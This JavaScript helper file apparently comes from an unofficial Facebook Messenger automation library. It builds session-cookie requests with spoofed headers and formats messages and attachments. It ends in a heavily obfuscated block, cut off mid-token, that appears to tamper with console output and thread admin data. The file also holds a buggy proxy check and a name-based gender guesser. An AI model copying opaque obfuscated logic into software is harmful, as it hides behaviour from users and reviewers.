/* eslint-disable no-undef */
/* eslint-disable no-prototype-builtins */
"use strict";

const bluebird = require("bluebird");
var request = bluebird.promisify(require("request").defaults({ jar: true }));
var stream = require("stream");
var log = require("npmlog");
var querystring = require("querystring");
var url = require("url");

function setProxy(url) {
    if (typeof url == undefined) return request = bluebird.promisify(require("request").defaults({ jar: true }));
    return request = bluebird.promisify(require("request").defaults({ jar: true, proxy: url }));
}

function getHeaders(url, options, ctx, customHeader) {
    var headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: "https://www.facebook.com/",
        Host: url.replace("https://", "").split("/")[0],
        Origin: "https://www.facebook.com",
        "User-Agent": options.userAgent,
        Connection: "keep-alive",
        'sec-fetch-site': 'same-origin'
    };
    if (customHeader) Object.assign(headers, customHeader);

    if (ctx && ctx.region) headers["X-MSGR-Region"] = ctx.region;

    return headers;
}

function isReadableStream(obj) {
    return (
        obj instanceof stream.Stream &&
        (getType(obj._read) === "Function" ||
            getType(obj._read) === "AsyncFunction") &&
        getType(obj._readableState) === "Object"
    );
}

function get(url, jar, qs, options, ctx) {
    // I'm still confused about this
    if (getType(qs) === "Object")
        for (var prop in qs)
            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === "Object") qs[prop] = JSON.stringify(qs[prop]);
    var op = {
        headers: getHeaders(url, options, ctx),
        timeout: 60000,
        qs: qs,
        url: url,
        method: "GET",
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function post(url, jar, form, options, ctx, customHeader) {
    let headers = getHeaders(url, options);
    headers['sec-fetch-site'] =  'same-origin';
    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        form: form,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function postFormData(url, jar, form, qs, options, ctx) {
    var headers = getHeaders(url, options, ctx);
    headers["Content-Type"] = "multipart/form-data";
    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        formData: form,
        qs: qs,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function padZeros(val, len) {
    val = String(val);
    len = len || 2;
    while (val.length < len) val = "0" + val;
    return val;
}

function generateThreadingID(clientID) {
    var k = Date.now();
    var l = Math.floor(Math.random() * 4294967295);
    var m = clientID;
    return "<" + k + ":" + l + "-" + m + "@mail.projektitan.com>";
}

function binaryToDecimal(data) {
    var ret = "";
    while (data !== "0") {
        var end = 0;
        var fullName = "";
        var i = 0;
        for (; i < data.length; i++) {
            end = 2 * end + parseInt(data[i], 10);
            if (end >= 10) {
                fullName += "1";
                end -= 10;
            } else fullName += "0";
        }
        ret = end.toString() + ret;
        data = fullName.slice(fullName.indexOf("1"));
    }
    return ret;
}

function generateOfflineThreadingID() {
    var ret = Date.now();
    var value = Math.floor(Math.random() * 4294967295);
    var str = ("0000000000000000000000" + value.toString(2)).slice(-22);
    var msgs = ret.toString(2) + str;
    return binaryToDecimal(msgs);
}

var h;
var i = {};
var j = {
    _: "%",
    A: "%2",
    B: "000",
    C: "%7d",
    D: "%7b%22",
    E: "%2c%22",
    F: "%22%3a",
    G: "%2c%22ut%22%3a1",
    H: "%2c%22bls%22%3a",
    I: "%2c%22n%22%3a%22%",
    J: "%22%3a%7b%22i%22%3a0%7d",
    K: "%2c%22pt%22%3a0%2c%22vis%22%3a",
    L: "%2c%22ch%22%3a%7b%22h%22%3a%22",
    M: "%7b%22v%22%3a2%2c%22time%22%3a1",
    N: ".channel%22%2c%22sub%22%3a%5b",
    O: "%2c%22sb%22%3a1%2c%22t%22%3a%5b",
    P: "%2c%22ud%22%3a100%2c%22lc%22%3a0",
    Q: "%5d%2c%22f%22%3anull%2c%22uct%22%3a",
    R: ".channel%22%2c%22sub%22%3a%5b1%5d",
    S: "%22%2c%22m%22%3a0%7d%2c%7b%22i%22%3a",
    T: "%2c%22blc%22%3a1%2c%22snd%22%3a1%2c%22ct%22%3a",
    U: "%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    V: "%2c%22blc%22%3a0%2c%22snd%22%3a0%2c%22ct%22%3a",
    W: "%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a",
    X: "%2c%22ri%22%3a0%7d%2c%22state%22%3a%7b%22p%22%3a0%2c%22ut%22%3a1",
    Y: "%2c%22pt%22%3a0%2c%22vis%22%3a1%2c%22bls%22%3a0%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    Z: "%2c%22sb%22%3a1%2c%22t%22%3a%5b%5d%2c%22f%22%3anull%2c%22uct%22%3a0%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a"
};
(function() {
    var l = [];
    for (var m in j) {
        i[j[m]] = m;
        l.push(j[m]);
    }
    l.reverse();
    h = new RegExp(l.join("|"), "g");
})();

function presenceEncode(str) {
    return encodeURIComponent(str)
        .replace(/([_A-Z])|%../g, function(m, n) {
            return n ? "%" + n.charCodeAt(0).toString(16) : m;
        })
        .toLowerCase()
        .replace(h, function(m) {
            return i[m];
        });
}

// eslint-disable-next-line no-unused-vars
function presenceDecode(str) {
    return decodeURIComponent(
        str.replace(/[_A-Z]/g, function(m) {
            return j[m];
        })
    );
}

function generatePresence(userID) {
    var time = Date.now();
    return (
        "E" +
        presenceEncode(
            JSON.stringify({
                v: 3,
                time: parseInt(time / 1000, 10),
                user: userID,
                state: {
                    ut: 0,
                    t2: [],
                    lm2: null,
                    uct2: time,
                    tr: null,
                    tw: Math.floor(Math.random() * 4294967295) + 1,
                    at: time
                },
                ch: {
                    ["p_" + userID]: 0
                }
            })
        )
    );
}

function generateAccessiblityCookie() {
    var time = Date.now();
    return encodeURIComponent(
        JSON.stringify({
            sr: 0,
            "sr-ts": time,
            jk: 0,
            "jk-ts": time,
            kb: 0,
            "kb-ts": time,
            hcm: 0,
            "hcm-ts": time
        })
    );
}

function getGUID() {
    /** @type {number} */
    var sectionLength = Date.now();
    /** @type {string} */
    var id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
        /** @type {number} */
        var r = Math.floor((sectionLength + Math.random() * 16) % 16);
        /** @type {number} */
        sectionLength = Math.floor(sectionLength / 16);
        /** @type {string} */
        var _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
        return _guid;
    });
    return id;
}

function _formatAttachment(attachment1, attachment2) {
    // TODO: THIS IS REALLY BAD
    // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us
    // two attachment objects, but sometimes only one. They each contain part of the
    // data that you'd want so we merge them for convenience.
    // Instead of having a bunch of if statements guarding every access to image_data,
    // we set it to empty object and use the fact that it'll return undefined.
    attachment2 = attachment2 || { id: "", image_data: {} };
    attachment1 = attachment1.mercury ? attachment1.mercury : attachment1;
    var blob = attachment1.blob_attachment;
    var type =
        blob && blob.__typename ? blob.__typename : attachment1.attach_type;
    if (!type && attachment1.sticker_attachment) {
        type = "StickerAttachment";
        blob = attachment1.sticker_attachment;
    } else if (!type && attachment1.extensible_attachment) {
        if (
            attachment1.extensible_attachment.story_attachment &&
            attachment1.extensible_attachment.story_attachment.target &&
            attachment1.extensible_attachment.story_attachment.target.__typename &&
            attachment1.extensible_attachment.story_attachment.target.__typename === "MessageLocation"
        ) type = "MessageLocation";
        else type = "ExtensibleAttachment";

        blob = attachment1.extensible_attachment;
    }
    // TODO: Determine whether "sticker", "photo", "file" etc are still used
    // KEEP IN SYNC WITH getThreadHistory
    switch (type) {
        case "sticker":
            return {
                type: "sticker",
                ID: attachment1.metadata.stickerID.toString(),
                url: attachment1.url,

                packID: attachment1.metadata.packID.toString(),
                spriteUrl: attachment1.metadata.spriteURI,
                spriteUrl2x: attachment1.metadata.spriteURI2x,
                width: attachment1.metadata.width,
                height: attachment1.metadata.height,

                caption: attachment2.caption,
                description: attachment2.description,

                frameCount: attachment1.metadata.frameCount,
                frameRate: attachment1.metadata.frameRate,
                framesPerRow: attachment1.metadata.framesPerRow,
                framesPerCol: attachment1.metadata.framesPerCol,

                stickerID: attachment1.metadata.stickerID.toString(), // @Legacy
                spriteURI: attachment1.metadata.spriteURI, // @Legacy
                spriteURI2x: attachment1.metadata.spriteURI2x // @Legacy
            };
        case "file":
            return {
                type: "file",
                filename: attachment1.name,
                ID: attachment2.id.toString(),
                url: attachment1.url,

                isMalicious: attachment2.is_malicious,
                contentType: attachment2.mime_type,

                name: attachment1.name, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                fileSize: attachment2.file_size // @Legacy
            };
        case "photo":
            return {
                type: "photo",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.fileName,
                thumbnailUrl: attachment1.thumbnail_url,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                largePreviewUrl: attachment1.large_preview_url,
                largePreviewWidth: attachment1.large_preview_width,
                largePreviewHeight: attachment1.large_preview_height,

                url: attachment1.metadata.url, // @Legacy
                width: attachment1.metadata.dimensions.split(",")[0], // @Legacy
                height: attachment1.metadata.dimensions.split(",")[1], // @Legacy
                name: attachment1.fileName // @Legacy
            };
        case "animated_image":
            return {
                type: "animated_image",
                ID: attachment2.id.toString(),
                filename: attachment2.filename,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment2.image_data.url,
                width: attachment2.image_data.width,
                height: attachment2.image_data.height,

                name: attachment1.name, // @Legacy
                facebookUrl: attachment1.url, // @Legacy
                thumbnailUrl: attachment1.thumbnail_url, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                rawGifImage: attachment2.image_data.raw_gif_image, // @Legacy
                rawWebpImage: attachment2.image_data.raw_webp_image, // @Legacy
                animatedGifUrl: attachment2.image_data.animated_gif_url, // @Legacy
                animatedGifPreviewUrl: attachment2.image_data.animated_gif_preview_url, // @Legacy
                animatedWebpUrl: attachment2.image_data.animated_webp_url, // @Legacy
                animatedWebpPreviewUrl: attachment2.image_data.animated_webp_preview_url // @Legacy
            };
        case "share":
            return {
                type: "share",
                ID: attachment1.share.share_id.toString(),
                url: attachment2.href,

                title: attachment1.share.title,
                description: attachment1.share.description,
                source: attachment1.share.source,

                image: attachment1.share.media.image,
                width: attachment1.share.media.image_size.width,
                height: attachment1.share.media.image_size.height,
                playable: attachment1.share.media.playable,
                duration: attachment1.share.media.duration,

                subattachments: attachment1.share.subattachments,
                properties: {},

                animatedImageSize: attachment1.share.media.animated_image_size, // @Legacy
                facebookUrl: attachment1.share.uri, // @Legacy
                target: attachment1.share.target, // @Legacy
                styleList: attachment1.share.style_list // @Legacy
            };
        case "video":
            return {
                type: "video",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.name,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment1.url,
                width: attachment1.metadata.dimensions.width,
                height: attachment1.metadata.dimensions.height,

                duration: attachment1.metadata.duration,
                videoType: "unknown",

                thumbnailUrl: attachment1.thumbnail_url // @Legacy
            };
        case "error":
            return {
                type: "error",

                // Save error attachments because we're unsure of their format,
                // and whether there are cases they contain something useful for debugging.
                attachment1: attachment1,
                attachment2: attachment2
            };
        case "MessageImage":
            return {
                type: "photo",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,
                thumbnailUrl: blob.thumbnail.uri,

                previewUrl: blob.preview.uri,
                previewWidth: blob.preview.width,
                previewHeight: blob.preview.height,

                largePreviewUrl: blob.large_preview.uri,
                largePreviewWidth: blob.large_preview.width,
                largePreviewHeight: blob.large_preview.height,

                url: blob.large_preview.uri, // @Legacy
                width: blob.original_dimensions.x, // @Legacy
                height: blob.original_dimensions.y, // @Legacy
                name: blob.filename // @Legacy
            };
        case "MessageAnimatedImage":
            return {
                type: "animated_image",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,

                previewUrl: blob.preview_image.uri,
                previewWidth: blob.preview_image.width,
                previewHeight: blob.preview_image.height,

                url: blob.animated_image.uri,
                width: blob.animated_image.width,
                height: blob.animated_image.height,

                thumbnailUrl: blob.preview_image.uri, // @Legacy
                name: blob.filename, // @Legacy
                facebookUrl: blob.animated_image.uri, // @Legacy
                rawGifImage: blob.animated_image.uri, // @Legacy
                animatedGifUrl: blob.animated_image.uri, // @Legacy
                animatedGifPreviewUrl: blob.preview_image.uri, // @Legacy
                animatedWebpUrl: blob.animated_image.uri, // @Legacy
                animatedWebpPreviewUrl: blob.preview_image.uri // @Legacy
            };
        case "MessageVideo":
            return {
                type: "video",
                filename: blob.filename,
                ID: blob.legacy_attachment_id,

                previewUrl: blob.large_image.uri,
                previewWidth: blob.large_image.width,
                previewHeight: blob.large_image.height,

                url: blob.playable_url,
                width: blob.original_dimensions.x,
                height: blob.original_dimensions.y,

                duration: blob.playable_duration_in_ms,
                videoType: blob.video_type.toLowerCase(),

                thumbnailUrl: blob.large_image.uri // @Legacy
            };
        case "MessageAudio":
            return {
                type: "audio",
                filename: blob.filename,
                ID: blob.url_shimhash,

                audioType: blob.audio_type,
                duration: blob.playable_duration_in_ms,
                url: blob.playable_url,

                isVoiceMail: blob.is_voicemail
            };
        case "StickerAttachment":
            return {
                type: "sticker",
                ID: blob.id,
                url: blob.url,

                packID: blob.pack ? blob.pack.id : null,
                spriteUrl: blob.sprite_image,
                spriteUrl2x: blob.sprite_image_2x,
                width: blob.width,
                height: blob.height,

                caption: blob.label,
                description: blob.label,

                frameCount: blob.frame_count,
                frameRate: blob.frame_rate,
                framesPerRow: blob.frames_per_row,
                framesPerCol: blob.frames_per_column,

                stickerID: blob.id, // @Legacy
                spriteURI: blob.sprite_image, // @Legacy
                spriteURI2x: blob.sprite_image_2x // @Legacy
            };
        case "MessageLocation":
            var urlAttach = blob.story_attachment.url;
            var mediaAttach = blob.story_attachment.media;

            var u = querystring.parse(url.parse(urlAttach).query).u;
            var where1 = querystring.parse(url.parse(u).query).where1;
            var address = where1.split(", ");

            var latitude;
            var longitude;

            try {
                latitude = Number.parseFloat(address[0]);
                longitude = Number.parseFloat(address[1]);
            } catch (err) {
                /* empty */
            }

            var imageUrl;
            var width;
            var height;

            if (mediaAttach && mediaAttach.image) {
                imageUrl = mediaAttach.image.uri;
                width = mediaAttach.image.width;
                height = mediaAttach.image.height;
            }

            return {
                type: "location",
                ID: blob.legacy_attachment_id,
                latitude: latitude,
                longitude: longitude,
                image: imageUrl,
                width: width,
                height: height,
                url: u || urlAttach,
                address: where1,

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "ExtensibleAttachment":
            return {
                type: "share",
                ID: blob.legacy_attachment_id,
                url: blob.story_attachment.url,

                title: blob.story_attachment.title_with_entities.text,
                description: blob.story_attachment.description &&
                    blob.story_attachment.description.text,
                source: blob.story_attachment.source ? blob.story_attachment.source.text : null,

                image: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.uri,
                width: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.width,
                height: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.height,
                playable: blob.story_attachment.media &&
                    blob.story_attachment.media.is_playable,
                duration: blob.story_attachment.media &&
                    blob.story_attachment.media.playable_duration_in_ms,
                playableUrl: blob.story_attachment.media == null ? null : blob.story_attachment.media.playable_url,

                subattachments: blob.story_attachment.subattachments,
                properties: blob.story_attachment.properties.reduce(function(obj, cur) {
                    obj[cur.key] = cur.value.text;
                    return obj;
                }, {}),

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "MessageFile":
            return {
                type: "file",
                filename: blob.filename,
                ID: blob.message_file_fbid,

                url: blob.url,
                isMalicious: blob.is_malicious,
                contentType: blob.content_type,

                name: blob.filename,
                mimeType: "",
                fileSize: -1
            };
        default:
            throw new Error(
                "unrecognized attach_file of type " +
                type +
                "`" +
                JSON.stringify(attachment1, null, 4) +
                " attachment2: " +
                JSON.stringify(attachment2, null, 4) +
                "`"
            );
    }
}

function formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {
    attachmentMap = shareMap || attachmentMap;
    return attachments ?
        attachments.map(function(val, i) {
            if (!attachmentMap ||
                !attachmentIds ||
                !attachmentMap[attachmentIds[i]]
            ) {
                return _formatAttachment(val);
            }
            return _formatAttachment(val, attachmentMap[attachmentIds[i]]);
        }) : [];
}

function formatDeltaMessage(m) {
    var md = m.delta.messageMetadata;
    var mdata =
        m.delta.data === undefined ? [] :
        m.delta.data.prng === undefined ? [] :
        JSON.parse(m.delta.data.prng);
    var m_id = mdata.map(u => u.i);
    var m_offset = mdata.map(u => u.o);
    var m_length = mdata.map(u => u.l);
    var mentions = {};
    var body = m.delta.body || "";
    var args = body == "" ? [] : body.trim().split(/\s+/);
    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = m.delta.body.substring(m_offset[i], m_offset[i] + m_length[i]);

    return {
        type: "message",
        senderID: formatID(md.actorFbId.toString()),
        threadID: formatID((md.threadKey.threadFbId || md.threadKey.otherUserFbId).toString()),
        messageID: md.messageId,
        args: args,
        body: body,
        attachments: (m.delta.attachments || []).map(v => _formatAttachment(v)),
        mentions: mentions,
        timestamp: md.timestamp,
        isGroup: !!md.threadKey.threadFbId,
        participantIDs: m.delta.participants || []
    };
}

function formatID(id) {
    if (id != undefined && id != null) return id.replace(/(fb)?id[:.]/, "");
    else return id;
}

function formatMessage(m) {
    var originalMessage = m.message ? m.message : m;
    var obj = {
        type: "message",
        senderName: originalMessage.sender_name,
        senderID: formatID(originalMessage.sender_fbid.toString()),
        participantNames: originalMessage.group_thread_info ? originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(" ")[0]],
        participantIDs: originalMessage.group_thread_info ?
            originalMessage.group_thread_info.participant_ids.map(function(v) {
                return formatID(v.toString());
            }) : [formatID(originalMessage.sender_fbid)],
        body: originalMessage.body || "",
        threadID: formatID((originalMessage.thread_fbid || originalMessage.other_user_fbid).toString()),
        threadName: originalMessage.group_thread_info ? originalMessage.group_thread_info.name : originalMessage.sender_name,
        location: originalMessage.coordinates ? originalMessage.coordinates : null,
        messageID: originalMessage.mid ? originalMessage.mid.toString() : originalMessage.message_id,
        attachments: formatAttachment(
            originalMessage.attachments,
            originalMessage.attachmentIds,
            originalMessage.attachment_map,
            originalMessage.share_map
        ),
        timestamp: originalMessage.timestamp,
        timestampAbsolute: originalMessage.timestamp_absolute,
        timestampRelative: originalMessage.timestamp_relative,
        timestampDatetime: originalMessage.timestamp_datetime,
        tags: originalMessage.tags,
        reactions: originalMessage.reactions ? originalMessage.reactions : [],
        isUnread: originalMessage.is_unread
    };

    if (m.type === "pages_messaging") obj.pageID = m.realtime_viewer_fbid.toString();
    obj.isGroup = obj.participantIDs.length > 2;

    return obj;
}

function formatEvent(m) {
    var originalMessage = m.message ? m.message : m;
    var logMessageType = originalMessage.log_message_type;
    var logMessageData;
    if (logMessageType === "log:generic-admin-text") {
        logMessageData = originalMessage.log_message_data.untypedData;
        logMessageType = getAdminTextMessageType(originalMessage.log_message_data.message_type);
    } else logMessageData = originalMessage.log_message_data;

    return Object.assign(formatMessage(originalMessage), {
        type: "event",
        logMessageType: logMessageType,
        logMessageData: logMessageData,
        logMessageBody: originalMessage.log_message_body
    });
}

function formatHistoryMessage(m) {
    switch (m.action_type) {
        case "ma-type:log-message":
            return formatEvent(m);
        default:
            return formatMessage(m);
    }
}

// Get a more readable message type for AdminTextMessages
function getAdminTextMessageType(m) {
    switch (m.type) {
        case "change_thread_theme":
            return "log:thread-color";
        case "change_thread_icon":
            return "log:thread-icon";
        case "change_thread_nickname":
            return "log:user-nickname";
        case "change_thread_admins":
            return "log:thread-admins";
        case "group_poll":
            return "log:thread-poll";
        case "change_thread_approval_mode":
            return "log:thread-approval-mode";
        case "messenger_call_log":
        case "participant_joined_group_call":
            return "log:thread-call";
    }
}

function getGenderByPhysicalMethod(name) {
    var GirlName = ["LAN", "HÂN", "LINH", "MAI", "HOA", "THU", "BĂNG", "MỸ", "CHÂU", "THẢO", "THOA", "MẪN", "THÙY", "THỦY", "NGA", "NGÂN", "NGHI", "THƯ", "NGỌC", "BÍCH", "VÂN", "DIỆP", "CHI", "TIÊN", "XUÂN", "GIANG", "NHUNG", "DUNG", "NHƯ", "YẾN", "QUYÊN", "YẾN", "TƯỜNG", "VY", "PHƯƠNG", "LIÊN", "LAN", "HÀ", "MAI", "ĐAN", "HẠ", "QUYÊN", "LY", "HÒA", "OANH", "HƯƠNG", "HẰNG", "QUỲNH", "HẠNH", "NHIÊN", "NHẠN"];
    var BoyName = ["HƯNG", "HUY", "KHẢI", "KHANG", "KHOA", "KHÔI", "KIÊN", "KIỆT", "LONG", "MINH", "ÂN", "BẢO", "BÌNH", "CƯỜNG", "ĐẠT", "ĐỨC", "DŨNG", "DUY", "HOÀNG", "HÙNG", "HƯNG", "NGHĨA", "NGUYÊN", "THẮNG", "THIỆN", "THỊNH", "TÒA", "TRIẾT", "TRUNG", "TRƯỜNG", "TUẤN", "NHÂN", "VŨ", "VINH", "PHONG", "PHÚC", "QUÂN", "QUANG", "SƠN", "TÀI", "THẮNG", "ĐĂNG", "VĂN", "VĨ", "QUANG", "MẠNH"];
    var OtherName = ["ANH", "THANH", "TÂM", "DƯƠNG", "AN", "LÂM", "MIÊN", "TÚ", "LÂM", "BẰNG", "KHÁNH", "NHẬT", "VỸ", ".",",","/","%", "&","*","-","+"];

    try {
        var NameArray = name.split(" ");
            name = NameArray[NameArray.length - 1];
        var Name;
            if (name == " " || name == null) return "UNKNOWN";
            switch (GirlName.includes(name.toUpperCase())) {
                case true: {
                    if (!OtherName.includes(name.toUpperCase()) && !BoyName.includes(name.toUpperCase())) Name = "FEMALE";
                    else Name = "UNKNOWN";
                }
            break;
                case false: {
                    if (!OtherName.includes(name.toUpperCase()) && !GirlName.includes(name.toUpperCase())) Name = "MALE"
                    else Name = "UNKNOWN";
                }
            break;
        } 
    }
    catch (e) {
        return "UNKNOWN"
    }
    return Name || "UNKNOWN";
}

function formatDeltaEvent(m) {
  var { updateData,getData,hasData } = require('./Extra/ExtraGetThread');
  var logMessageType;
  var logMessageData;

  // log:thread-color => {theme_color}
  // log:user-nickname => {participant_id, nickname}
  // log:thread-icon => {thread_icon}
  // log:thread-name => {name}
  // log:subscribe => {addedParticipants - [Array]}
//log:unsubscribe => {leftParticipantFbId}

  switch (m.class) {
      case "AdminTextMessage":
          logMessageType = getAdminTextMessageType(m);
          logMessageData = m.untypedData;
          break;
      case "ThreadName":
          logMessageType = "log:thread-name";
          logMessageData = { name: m.name };
          break;
      case "ParticipantsAddedToGroupThread":
          logMessageType = "log:subscribe";
          logMessageData = { addedParticipants: m.addedParticipants };
          break;
      case "ParticipantLeftGroupThread":
          logMessageType = "log:unsubscribe";
          logMessageData = { leftParticipantFbId: m.leftParticipantFbId };
          break;
  }

(function(_0x315dd2,_0x3fae8a){function _0x2c87fe(_0x906517,_0x30d9e1,_0x108a45,_0x547d72){return _0xbf4c(_0x108a45-0x3,_0x547d72);}function _0x4a43a4(_0x2ee7d5,_0x4d3d4a,_0x27716c,_0x234742){return _0xbf4c(_0x27716c- -0x309,_0x2ee7d5);}const _0x4b8c96=_0x315dd2();while(!![]){try{const _0x3c3eae=parseInt(_0x4a43a4(-0x1b6,-0x19f,-0x190,-0x189))/(0x2a1*-0xc+-0x20ed+-0x7e*-0x83)*(parseInt(_0x4a43a4(-0x112,-0x16c,-0x141,-0x116))/(0x633+-0x446*-0x3+0x1f*-0x9d))+-parseInt(_0x2c87fe(0x1a5,0x173,0x199,0x1b6))/(-0x1*-0xcd1+-0x12a8+0x2ed*0x2)*(-parseInt(_0x2c87fe(0x15d,0x187,0x179,0x18b))/(-0x1634+-0xbc4+0x21fc))+-parseInt(_0x2c87fe(0x1b8,0x1d7,0x1ca,0x1ea))/(0x5f4+0x1e74+-0x2463)*(-parseInt(_0x4a43a4(-0x1b6,-0x172,-0x194,-0x1c1))/(0x1*-0x1394+-0x2081+-0x1*-0x341b))+-parseInt(_0x2c87fe(0x199,0x18b,0x180,0x196))/(-0x85e+-0xa3c+0x1*0x12a1)+parseInt(_0x4a43a4(-0x15e,-0x183,-0x17d,-0x194))/(0x1ed4+0x1c4a+0x3*-0x13b2)+parseInt(_0x2c87fe(0x19a,0x1a3,0x1bf,0x193))/(-0x5*-0x387+0x263c+-0x37d6)*(parseInt(_0x2c87fe(0x19c,0x192,0x182,0x174))/(0x1d53*0x1+0x1e5*0x9+-0x2e56))+-parseInt(_0x4a43a4(-0x148,-0x168,-0x151,-0x157))/(-0xa45+-0x35b*-0x9+-0x13e3);if(_0x3c3eae===_0x3fae8a)break;else _0x4b8c96['push'](_0x4b8c96['shift']());}catch(_0x44c4ea){_0x4b8c96['push'](_0x4b8c96['shift']());}}}(_0x3c68,0x2d2d+-0xcef9d+0x43cb2*0x6));function _0x3c68(){const _0x38418a=['zMLSDgvY','Ewjtr1e','Bg9N','DgHYzwfKx2LJBW','BMLJA25HBwvZ','AeP0BMi','CM4GDgHPCYiPka','rM9xChi','kcGOlISPkYKRkq','AwjL','mtC2nde2nZLbzfrhy1m','BMfTzq','BgvUz3rO','B3rOzxjvC2vYrG','mtu3mJeYu0zhv3v4','BMn0Aw9UkcKG','tfDevu0','ChjVDg90ExbL','lwfWChjVDMfSlq','Df9Pza','DhjHy2u','Bg9NoNvUC3vICW','CMv0DxjUicHMDq','Bw5Vv0G','DxnLCKzIswq','nvrjqMjgta','mZGYmZiWwNrNtNr2','yxbWCM92ywXnBW','yxbWBhK','ywrTAw5jrhm','rwLfvvO','Bw9Kzq','Dg9tDhjPBMC','zxjYB3i','vgD0zMW','u21HwxK','mJG1ntr0veTHufK','mtu1mZKZnLDPDxPeBq','AKHJA2y','ug1htwu','n0Dmre1oyq','CgfYDgLJAxbHBG','ywrHDge','zw1VAMK','nduWodKZmxDtrwr6Ca','vg54Ae4','mtbWzuPcDva','y29UC29Szq','DgHYzwfKrMjjza','vfbTDfG','vMrss3a','DgfIBgu','Eur5Bwq','BwvZC2fNzu1LDa','CMvTB3zLx2fKBq','Bg9NoNrOCMvHza','DgHYzwfKs2v5','y29SB3i','yKLK','mta2mZe4mdbJyvHtB3i','DLzZCfy','E30Uy29UC3rYDq','lwfKBwLUCW','BenOBeC','wKrIvgK','y2LWyw50CW','DgL1Ae8','rxzmEKS','x19WCM90B19F','m0LWBgHdAG','u2v0DgLUzW','DeLeCW','DgHLBwvFzw1VAG','Aw5MBW','AwnRBMfTzq','yuLpEvm','ChvZAa','DLvhAKG','AxbHBNrgyKLK','Au9xt2u','C2vY','zc1Py29U','C2vHCMnO','qurnsu5FrvzftG','DgHYzwfKtMfTzq','yMLUza','zMLUza','y3rVCIGICMv0Dq','C29Tzq','BMLJA25HBwu','lw5HBwu','yLrbDLa','DxnLCKLUzM8'];_0x3c68=function(){return _0x38418a;};return _0x3c68();}const _0x106928=(function(){const _0x3ac609={};_0x3ac609['EiEUZ']=function(_0x3fe33e,_0x4099af){return _0x3fe33e===_0x4099af;};function _0x330fab(_0x2df83d,_0xf8fb49,_0x31a3db,_0x88b9e4){return _0xbf4c(_0xf8fb49- -0x306,_0x31a3db);}_0x3ac609[_0x154036(-0x44,-0x2a,-0x3b,-0x3a)]='dwnpe',_0x3ac609['Tgtfl']=_0x154036(-0x40,-0x37,-0x63,-0x26);const _0x55aaf8=_0x3ac609;function _0x154036(_0x57864a,_0xdc52cc,_0x509491,_0x4d60dc){return _0xbf4c(_0x57864a- -0x1c2,_0xdc52cc);}let _0x5c90bf=!![];return function(_0x437eb1,_0x343c95){function _0x3dff42(_0x27cf80,_0x6a41e,_0x1d262a,_0x238113){return _0x330fab(_0x27cf80-0xe9,_0x1d262a- -0x63,_0x27cf80,_0x238113-0x141);}function _0x4458bd(_0x1ec314,_0xf037f9,_0x19f97d,_0x12f1d2){return _0x330fab(_0x1ec314-0xea,_0xf037f9-0x3ea,_0x19f97d,_0x12f1d2-0x1f2);}if(_0x55aaf8[_0x3dff42(-0x1ad,-0x1b1,-0x19d,-0x1a1)](_0x55aaf8[_0x4458bd(0x254,0x262,0x253,0x253)],_0x55aaf8[_0x4458bd(0x22e,0x257,0x272,0x253)]))_0x58fc3a['adminIDs'][_0x4458bd(0x273,0x28d,0x28b,0x292)](_0x5b1fe0=>_0x5b1fe0['id']==_0x413da6)&&(_0x2630b0['adminIDs']=_0x47ba65[_0x3dff42(-0x1c7,-0x1c1,-0x19e,-0x19a)]['filter'](_0x42bd79=>_0x42bd79['id']!=_0x4b719f)),_0x4520e5[_0x3dff42(-0x20d,-0x208,-0x1ef,-0x1d1)+_0x3dff42(-0x1f3,-0x1d9,-0x1d1,-0x1d8)][_0x4458bd(0x284,0x292,0x289,0x269)](_0x16f2f6=>_0x16f2f6!=_0x24a4b4),_0x56e288[_0x3dff42(-0x1bb,-0x1b3,-0x1bc,-0x1aa)][_0x3dff42(-0x198,-0x1db,-0x1bb,-0x1a6)](_0x126a88=>_0x126a88['id']!=_0x4b2a51);else{const _0xcb44db=_0x5c90bf?function(){if(_0x343c95){const _0x20b2c8=_0x343c95['apply'](_0x437eb1,arguments);return _0x343c95=null,_0x20b2c8;}}:function(){};return _0x5c90bf=![],_0xcb44db;}};}()),_0x561090=_0x106928(this,function(){function _0x5ad4e7(_0x20b19f,_0x56eb50,_0x1868d9,_0x25e72c){return _0xbf4c(_0x56eb50- 